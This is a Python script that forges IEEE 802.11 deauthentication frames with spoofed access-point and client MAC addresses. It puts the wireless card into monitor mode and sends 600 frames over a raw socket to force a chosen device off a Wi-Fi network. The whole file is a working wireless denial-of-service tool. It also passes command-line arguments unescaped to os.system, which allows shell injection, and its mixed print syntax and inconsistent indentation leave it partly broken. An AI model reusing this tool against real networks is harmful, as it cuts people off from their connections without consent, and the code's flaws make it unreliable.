#!/usr/bin/env python
import sys, socket, struct, time, os, subprocess, array, binascii, ctypes

# Change to match station, access point, and wireless interface
#STATION = '08:11:96:ca:3e:38'
#AP = "00:18:18:ff:e1:50"
#INTERFACE = "mon0"

# return a packed radiotap header
def pack_radiotap():
    r_rev = 0
    r_pad = 0
    r_len = 26
    r_preset_flags = 0x0000482f
    r_timestamp = 0
    r_flags = 0
    r_rate = 2
    r_freq = 2437 # 2.4 GHZ
    r_ch_type = 0xa0
    r_signal = -48
    r_antenna = 1
    r_rx_flags = 0
    return struct.pack('BBHIQBBHHbBH', r_rev, r_pad, r_len, r_preset_flags, r_timestamp, r_flags, r_rate, r_freq, r_ch_type,
                   r_signal, r_antenna, r_rx_flags)

# Define a structure for the frame control field of the 802.11 header
# This is a 2 byte bitfield (2 bytes total, elements are only a few bits)
class fc_bitfields(ctypes.LittleEndianStructure):
    _fields_ = [
        ("version", ctypes.c_uint16, 2),
        ("type", ctypes.c_uint16, 2),
        ("subtype", ctypes.c_uint16, 4),
        ("to_ds", ctypes.c_uint16, 1),
        ("from_ds", ctypes.c_uint16, 1),
        ("more_frags", ctypes.c_uint16, 1),
        ("retry", ctypes.c_uint16, 1),
        ("power_mgt", ctypes.c_uint16, 1),
        ("more_data", ctypes.c_uint16, 1),
        ("protected", ctypes.c_uint16, 1),
        ("order", ctypes.c_uint16, 1)
    ]

# return a packed dot11 header
def pack_dot11(ap, sta, x):
    #####################################

    # Construct IEEE 802.11 header for disassociate packet
    ieee80211_hdr_fc = fc_bitfields()  # 2 bytes - Combination of Type/Subtype/Frame Ctrl
    ieee80211_hdr_fc.version = 0  # Version 0
    ieee80211_hdr_fc.type = 0  # Type 0 - Management frame
    ieee80211_hdr_fc.subtype = 12  # Subtype 12 - Deauthentication frame
    ieee80211_hdr_fc.to_ds = 0  # Not heading to DS (distributed system)
    ieee80211_hdr_fc.from_ds = 0  # Not leaving DS (distributed system)
    ieee80211_hdr_fc.more_frags = 0  # This is the last fragment
    ieee80211_hdr_fc.retry = 0  # Not retransmitted
    ieee80211_hdr_fc.power_mgt = 0  # Station will stay up
    ieee80211_hdr_fc.more_data = 0  # No data buffered
    ieee80211_hdr_fc.protected = 0  # Not protected
    ieee80211_hdr_fc.order = 0  # Not strictly ordered

    ieee80211_hdr_duration = 314  # 2 bytes - Duration in microseconds
    ieee80211_hdr_dst_addr = ap  # 6 bytes - MAC address of destination (AP in this case)
    ieee80211_hdr_src_addr = sta  # 6 bytes - MAC address of source (client in this case)
    ieee80211_hdr_bssid = ap  # 6 bytes - MAC address of BSS ID (AP in this case)
    seq_num = x
    frag_num = 0
    ieee80211_hdr_seq_num = struct.pack("H", (0xFFFF & (seq_num << 4)) | (0x000F & frag_num))
    # 2 bytes - Combination of sequence number (upper 12 bits)
    #           and fragment number (lower 4 bits)
    ieee80211_hdr_reason_code = 3  # 2 bytes - Reason code 3 = Station is leaving access point
    # https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/

    # TIP: The 802.11 header is specified in LITTLE ENDIAN format.
    # Use "<" when packing instead of "!".
    ieee80211_hdr = struct.pack("<2sH6s6s6s2sH",
                                bytes(ieee80211_hdr_fc),
                                ieee80211_hdr_duration,
                                ieee80211_hdr_dst_addr,
                                ieee80211_hdr_src_addr,
                                ieee80211_hdr_bssid,
                                ieee80211_hdr_seq_num,
                                ieee80211_hdr_reason_code)
    return ieee80211_hdr

# deauth the BSSIDs and clients listed
def deauth(interface, ap, station, reps):
    
    r_hdr = pack_radiotap()
    
    # create a socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((interface, 0))
    except socket.error:
        print('Failed to create socket on interface ', interface)
        sys.exit()
    # spam deauth frames to clients associated with macs
    for i in range(reps):
        print "Sequence #", i
        print "Radio header: ", binascii.b2a_hex(r_hdr)
        deauth_frame = pack_dot11(ap, station, i)
        print "Deauth frame: ", binascii.b2a_hex(deauth_frame)
        sock.send(r_hdr + deauth_frame)
    sock.close()

def main():
    print("Initializing monitor interface...")
    interface = sys.argv[1]
    ap = sys.argv[2]
    station = sys.argv[3]

    # Enable monitor mode on device
    #os.system("iw dev %s interface add mon0 type monitor && ifconfig mon0 down" % interface)  os.system("ifconfig %s down" % interface)
    os.system("iw dev %s interface add mon0 type monitor" % interface)
    time.sleep(5)
    os.system("ifconfig mon0 down")
    os.system("iw dev mon0 set type monitor")
    os.system("ifconfig mon0 up")

    # Convert MAC addresses into byte arrays
    mac_ap = binascii.unhexlify(ap.replace(":", ""))
    mac_sta = binascii.unhexlify(station.replace(":", ""))
    deauth(interface, mac_ap, mac_sta, 600)

if __name__ == '__main__':
	if len(sys.argv) != 4:
		print "Usage %s monitor_interface ap_mac station_mac" % sys.argv[0]
        else:
		main()
